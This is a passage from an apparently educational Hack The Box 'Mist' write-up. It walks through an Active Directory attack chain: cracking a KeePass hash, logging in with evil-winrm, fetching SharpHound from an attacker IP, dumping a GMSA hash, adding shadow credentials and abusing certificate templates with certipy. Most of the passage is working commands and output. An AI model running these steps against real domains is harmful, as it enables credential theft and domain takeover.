class="literal">---Administrator</span></span><br><span class="line">|   +<span class="literal">---3D</span> Objects</span><br><span class="line">|   +<span class="literal">---Contacts</span></span><br><span class="line">|   +<span class="literal">---Desktop</span></span><br><span class="line">|   |       user.txt</span><br><span class="line">|   |       </span><br><span class="line">|   +<span class="literal">---Documents</span></span><br><span class="line">|   +<span class="literal">---Downloads</span></span><br><span class="line">|   +<span class="literal">---Favorites</span></span><br><span class="line">|   |   |   Bing.url</span><br><span class="line">|   |   |   </span><br><span class="line">|   |   \<span class="literal">---Links</span></span><br><span class="line">|   +<span class="literal">---Links</span></span><br><span class="line">|   |       Desktop.lnk</span><br><span class="line">|   |       Downloads.lnk</span><br><span class="line">|   |       </span><br><span class="line">|   +<span class="literal">---Music</span></span><br><span class="line">|   +<span class="literal">---Pictures</span></span><br><span class="line">|   +<span class="literal">---Saved</span> Games</span><br><span class="line">|   +<span class="literal">---Searches</span></span><br><span class="line">|   \<span class="literal">---Videos</span></span><br><span class="line">+<span class="literal">---Administrator</span>.MIST</span><br><span class="line">|   +<span class="literal">---Desktop</span></span><br><span class="line">|   +<span class="literal">---Documents</span></span><br><span class="line">|   +<span class="literal">---Downloads</span></span><br><span class="line">|   +<span class="literal">---Favorites</span></span><br><span class="line">|   +<span class="literal">---Links</span></span><br><span class="line">|   +<span class="literal">---Music</span></span><br><span class="line">|   +<span class="literal">---Pictures</span></span><br><span class="line">|   +<span class="literal">---Saved</span> Games</span><br><span class="line">|   \<span class="literal">---Videos</span></span><br><span class="line">+<span class="literal">---Brandon</span>.Keywarp</span><br><span class="line">|   +<span class="literal">---Desktop</span></span><br><span class="line">|   +<span class="literal">---Documents</span></span><br><span class="line">|   +<span class="literal">---Downloads</span></span><br><span class="line">|   +<span class="literal">---Favorites</span></span><br><span class="line">|   +<span class="literal">---Links</span></span><br><span class="line">|   +<span class="literal">---Music</span></span><br><span class="line">|   +<span class="literal">---Pictures</span></span><br><span class="line">|   +<span class="literal">---Saved</span> Games</span><br><span class="line">|   \<span class="literal">---Videos</span></span><br><span class="line">+<span class="literal">---Public</span></span><br><span class="line">|   +<span class="literal">---Documents</span></span><br><span class="line">|   +<span class="literal">---Downloads</span></span><br><span class="line">|   +<span class="literal">---Music</span></span><br><span class="line">|   +<span class="literal">---Pictures</span></span><br><span class="line">|   \<span class="literal">---Videos</span></span><br><span class="line">+<span class="literal">---Sharon</span>.Mullard</span><br><span class="line">|   +<span class="literal">---Desktop</span></span><br><span class="line">|   +<span class="literal">---Documents</span></span><br><span class="line">|   |       sharon.kdbx</span><br><span class="line">|   |       </span><br><span class="line">|   +<span class="literal">---Downloads</span></span><br><span class="line">|   +<span class="literal">---Favorites</span></span><br><span class="line">|   +<span class="literal">---Links</span></span><br><span class="line">|   +<span class="literal">---Music</span></span><br><span class="line">|   +<span class="literal">---Pictures</span></span><br><span class="line">|   |       cats.png</span><br><span class="line">|   |       image_20022024.png</span><br><span class="line">|   |       </span><br><span class="line">|   +<span class="literal">---Saved</span> Games</span><br><span class="line">|   \<span class="literal">---Videos</span></span><br><span class="line">\<span class="literal">---svc_web</span></span><br><span class="line">    +<span class="literal">---Desktop</span></span><br><span class="line">    +<span class="literal">---Documents</span></span><br><span class="line">    +<span class="literal">---Downloads</span></span><br><span class="line">    +<span class="literal">---Favorites</span></span><br><span class="line">    +<span class="literal">---Links</span></span><br><span class="line">    +<span class="literal">---Music</span></span><br><span class="line">    +<span class="literal">---Pictures</span></span><br><span class="line">    +<span class="literal">---Saved</span> Games</span><br><span class="line">    \<span class="literal">---Videos</span></span><br><span class="line"><span class="built_in">PS</span> C:\users&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>The kdbx database and the two images were unusual.<br>I downloaded the files and checked the image:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Mist/priv.png"
                      alt="Password Part"
                ><figcaption>Password Part</figcaption></figure></p>
<p>I managed to acquire a part of the database password and managed to crack the rest using a specific pattern:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist]</span><br><span class="line">└─$ hashcat -a 3 -m 13400 --increment --increment-min 14 --increment-max 20 sharon.hash <span class="string">&#x27;UA7cpa[#1!_*ZX?a?a?a?a?a?a&#x27;</span> </span><br><span class="line"></span><br><span class="line">hashcat (v6.1.1) starting...</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">=============================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: pthread-AMD Ryzen 7 4800H with Radeon Graphics, 1417/1481 MB (512 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line"></span><br><span class="line">Applicable optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Brute-Force</span><br><span class="line"></span><br><span class="line">Watchdog: Hardware monitoring interface not found on your system.</span><br><span class="line">Watchdog: Temperature abort trigger disabled.</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 65 MB</span><br><span class="line"></span><br><span class="line">The wordlist or mask that you are using is too small.</span><br><span class="line">This means that hashcat cannot use the full parallel power of your device(s).</span><br><span class="line">Unless you supply more work, your cracking speed will drop.</span><br><span class="line">For tips on supplying more work, see: https://hashcat.net/faq/morework</span><br><span class="line"></span><br><span class="line">Approaching final keyspace - workload adjusted.  </span><br><span class="line"></span><br><span class="line">Session..........: hashcat                       </span><br><span class="line">Status...........: Exhausted</span><br><span class="line">Hash.Name........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)</span><br><span class="line">Hash.Target......: $keepass$*2*60000*0*ae4c58b24d564cf7e40298f973bfa92...3174dc</span><br><span class="line">Time.Started.....: Tue Sep 10 10:36:40 2024 (0 secs)</span><br><span class="line">Time.Estimated...: Tue Sep 10 10:36:40 2024 (0 secs)</span><br><span class="line">Guess.Mask.......: UA7cpa[<span class="comment">#1!_*ZX [14]</span></span><br><span class="line">Guess.Queue......: 1/7 (14.29%)</span><br><span class="line">Speed.<span class="comment">#1.........:        5 H/s (0.15ms) @ Accel:64 Loops:1024 Thr:1 Vec:8</span></span><br><span class="line">Recovered........: 0/1 (0.00%) Digests</span><br><span class="line">Progress.........: 1/1 (100.00%)</span><br><span class="line">Rejected.........: 0/1 (0.00%)</span><br><span class="line">Restore.Point....: 1/1 (100.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:59392-60000</span></span><br><span class="line">Candidates.<span class="comment">#1....: UA7cpa[#1!_*ZX -&gt; UA7cpa[#1!_*ZX</span></span><br><span class="line"></span><br><span class="line">The wordlist or mask that you are using is too small.</span><br><span class="line">This means that hashcat cannot use the full parallel power of your device(s).</span><br><span class="line">Unless you supply more work, your cracking speed will drop.</span><br><span class="line">For tips on supplying more work, see: https://hashcat.net/faq/morework</span><br><span class="line"></span><br><span class="line">Approaching final keyspace - workload adjusted.  </span><br><span class="line"></span><br><span class="line">$keepass$*2*60000*0*ae4c58b24d564cf7e40298f973bfa929f494a285e48a70b719b280200793ee67*761ad6f646fff6f41a844961b4cc815dc4cd0d5871520815f51dd1a5972f6c55*6520725ffa21f113d82f5240f3be21b6*ce6d93ca81cb7f1918210d0752878186b9e8965adef69a2a896456680b532162*dda750ac8a3355d831f62e1e4e99970f6bfe6b7d2b6d429ed7b6aca28d3174dc:UA7cpa[<span class="comment">#1!_*ZX@</span></span><br><span class="line">                                                 </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)</span><br><span class="line">Hash.Target......: $keepass$*2*60000*0*ae4c58b24d564cf7e40298f973bfa92...3174dc</span><br><span class="line">Time.Started.....: Tue Sep 10 10:36:40 2024 (1 sec)</span><br><span class="line">Time.Estimated...: Tue Sep 10 10:36:41 2024 (0 secs)</span><br><span class="line">Guess.Mask.......: UA7cpa[<span class="comment">#1!_*ZX?a [15]</span></span><br><span class="line">Guess.Queue......: 2/7 (28.57%)</span><br><span class="line">Speed.<span class="comment">#1.........:      402 H/s (4.30ms) @ Accel:64 Loops:1024 Thr:1 Vec:8</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 95/95 (100.00%)</span><br><span class="line">Rejected.........: 0/95 (0.00%)</span><br><span class="line">Restore.Point....: 0/95 (0.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:59392-60000</span></span><br><span class="line">Candidates.<span class="comment">#1....: UA7cpa[#1!_*ZXX -&gt; UA7cpa[#1!_*ZX~</span></span><br><span class="line"></span><br><span class="line">Started: Tue Sep 10 10:36:13 2024</span><br><span class="line">Stopped: Tue Sep 10 10:36:41 2024</span><br><span class="line">                                                                                                                                                                                 </span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist]</span><br><span class="line">└─$ <span class="built_in">cat</span> sharon.hash </span><br><span class="line">$keepass$*2*60000*0*ae4c58b24d564cf7e40298f973bfa929f494a285e48a70b719b280200793ee67*761ad6f646fff6f41a844961b4cc815dc4cd0d5871520815f51dd1a5972f6c55*6520725ffa21f113d82f5240f3be21b6*ce6d93ca81cb7f1918210d0752878186b9e8965adef69a2a896456680b532162*dda750ac8a3355d831f62e1e4e99970f6bfe6b7d2b6d429ed7b6aca28d3174dc</span><br></pre></td></tr></table></figure></div>

<p>The password is <code>UA7cpa[#1!_*ZX@</code></p>
<p>Opening the database I can find the password for <code>OP_SHARON.MULLARD</code> (we can get the name from the users directory):<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Mist/priv2.png"
                      alt="KDBX Database "
                ><figcaption>KDBX Database </figcaption></figure></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">──(kali㉿kali)-[~]</span><br><span class="line">└─$ proxychains evil-winrm -u <span class="string">&quot;OP_SHARON.MULLARD&quot;</span> -p <span class="string">&#x27;ImTiredOfThisJob:(&#x27;</span> -i 192.168.100.100</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:5985  ...  OK</span><br><span class="line">*Evil-WinRM* PS C:\Users\op_Sharon.Mullard\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">mist\op_sharon.mullard</span><br><span class="line">*Evil-WinRM* PS C:\Users\op_Sharon.Mullard\Documents&gt; </span><br></pre></td></tr></table></figure></div>

<p>I later used sharphound to exfiltrate data from the machine:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\op_Sharon.Mullard\documents&gt; iwr 10.10.x.x/SharpHound.ps1 -outfile s.ps1</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:5985  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:5985  ...  OK</span><br><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\op_Sharon.Mullard\documents&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\<span class="built_in">users</span>\op_Sharon.Mullard\documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         9/10/2024   8:00 AM         974235 s.ps1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\op_Sharon.Mullard\documents&gt; ./s.ps1</span><br><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\op_Sharon.Mullard\documents&gt; Invoke-BloodHound -CollectionMethod All -Verbose</span><br><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\op_Sharon.Mullard\documents&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\<span class="built_in">users</span>\op_Sharon.Mullard\documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         9/10/2024   8:00 AM           9992 20240910080038_BloodHound.zip</span><br><span class="line">-a----         9/10/2024   8:00 AM          12987 Nzc5ZjBiZTgtNmEwZi00Yjk3LTlkMGUtZTFiZmJmODdhMWI0.bin</span><br><span class="line">-a----         9/10/2024   8:00 AM         974235 s.ps1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\op_Sharon.Mullard\documents&gt; download 20240910080038_BloodHound.zip</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\<span class="built_in">users</span>\op_Sharon.Mullard\documents\20240910080038_BloodHound.zip to 20240910080038_BloodHound.zip</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\op_Sharon.Mullard\documents&gt; </span><br></pre></td></tr></table></figure></div>

<p>We can read GMSA by our current user to get svc_ca$ hash:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ proxychains4 netexec ldap 192.168.100.100 -u op_Sharon.Mullard -p <span class="string">&quot;ImTiredOfThisJob:(&quot;</span> --gmsa</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:636  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK</span><br><span class="line">SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:636  ...  OK</span><br><span class="line">LDAPS       192.168.100.100 636    DC01             [+] mist.htb\op_Sharon.Mullard:ImTiredOfThisJob:(</span><br><span class="line">LDAPS       192.168.100.100 636    DC01             [*] Getting GMSA Passwords</span><br><span class="line">LDAPS       192.168.100.100 636    DC01             Account: svc_ca$              NTLM: 542fb8bb34abc7460eb6800cd6399e54 </span><br></pre></td></tr></table></figure></div>

<p>And now, svc_ca$ has AddCredentialLink permissions on svc_cabackup, so I’ll be using <a class="link"   target="_blank" rel="noopener" href="https://github.com/ShutdownRepo/pywhisker" >pywhisker <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> to add it:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist/pywhisker]</span><br><span class="line">└─$ proxychains4 python3 pywhisker.py -d <span class="string">&quot;mist.htb&quot;</span> --dc-ip 192.168.100.100 -u <span class="string">&#x27;svc_ca$&#x27;</span> -H 542fb8bb34abc7460eb6800cd6399e54 --target <span class="string">&quot;svc_cabackup&quot;</span> --action <span class="string">&quot;add&quot;</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:389  ...  OK</span><br><span class="line">[*] Searching <span class="keyword">for</span> the target account</span><br><span class="line">[*] Target user found: CN=svc_cabackup,CN=Users,DC=mist,DC=htb</span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating KeyCredential</span><br><span class="line">[*] KeyCredential generated with DeviceID: bee71310-6810-c2f6-3b94-bacc4aea3e57</span><br><span class="line">[*] Updating the msDS-KeyCredentialLink attribute of svc_cabackup</span><br><span class="line">[+] Updated the msDS-KeyCredentialLink attribute of the target object</span><br><span class="line">[+] Saved PFX (<span class="comment">#PKCS12) certificate &amp; key at path: f43g4m4m.pfx</span></span><br><span class="line">[*] Must be used with password: 53qemuN1Tq4ze0kn1i8F</span><br><span class="line">[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist/pywhisker]</span><br><span class="line">└─$ certipy-ad cert -<span class="built_in">export</span> -pfx f43g4m4m.pfx -password <span class="string">&quot;53qemuN1Tq4ze0kn1i8F&quot;</span> -out unrpotected.pfx</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Writing PFX to <span class="string">&#x27;unrpotected.pfx&#x27;</span></span><br><span class="line">                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist/pywhisker]</span><br><span class="line">└─$ proxychains certipy auth -pfx unprotected.pfx -domain mist.htb -username SVC_CABACKUP -dc-ip 192.168.100.100 -ns 192.168.100.100</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">proxychains: can<span class="string">&#x27;t load process &#x27;</span>certipy<span class="string">&#x27;. (hint: it&#x27;</span>s probably a typo): No such file or directory</span><br><span class="line">                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist/pywhisker]</span><br><span class="line">└─$ proxychains certipy-ad auth -pfx unprotected.pfx -domain mist.htb -username SVC_CABACKUP -dc-ip 192.168.100.100 -ns 192.168.100.100</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[-] Got error: [Errno 2] No such file or directory: <span class="string">&#x27;unprotected.pfx&#x27;</span></span><br><span class="line">[-] Use -debug to <span class="built_in">print</span> a stacktrace</span><br><span class="line">                                                                                       </span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist/pywhisker]</span><br><span class="line">└─$ proxychains certipy-ad auth -pfx unrpotected.pfx -domain mist.htb -username SVC_CABACKUP -dc-ip 192.168.100.100 -ns 192.168.100.100 </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[!] Could not find identification <span class="keyword">in</span> the provided certificate</span><br><span class="line">[*] Using principal: svc_cabackup@mist.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:88  ...  OK</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;svc_cabackup.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup&#x27;</span></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:88  ...  OK</span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup@mist.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64</span><br></pre></td></tr></table></figure></div>




<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist/pywhisker]</span><br><span class="line">└─$ proxychains certipy-ad req -u <span class="string">&quot;svc_cabackup@mist.htb&quot;</span> -hashes <span class="string">&quot;:c9872f1bc10bdd522c12fc2ac9041b64&quot;</span> -template ManagerAuthentication -ca mist-DC01-CA -target dc01.mist.htb -key-size 4096 -dns-tcp -dc-ip 192.168.100.100</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:53  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:53  ...  OK</span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:445  ...  OK</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 62</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;svc_cabackup@mist.htb&#x27;</span></span><br><span class="line">[*] Certificate object SID is <span class="string">&#x27;S-1-5-21-1045809509-3006658589-2426055941-1135&#x27;</span></span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;svc_cabackup.pfx&#x27;</span></span><br><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist]</span><br><span class="line">└─$ proxychains certipy-ad auth -pfx svc_cabackup.pfx -dc-ip 192.168.100.100</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: svc_cabackup@mist.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:88  ...  OK</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;svc_cabackup.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup&#x27;</span></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:88  ...  OK</span><br><span class="line">[*] Got <span class="built_in">hash</span> <span 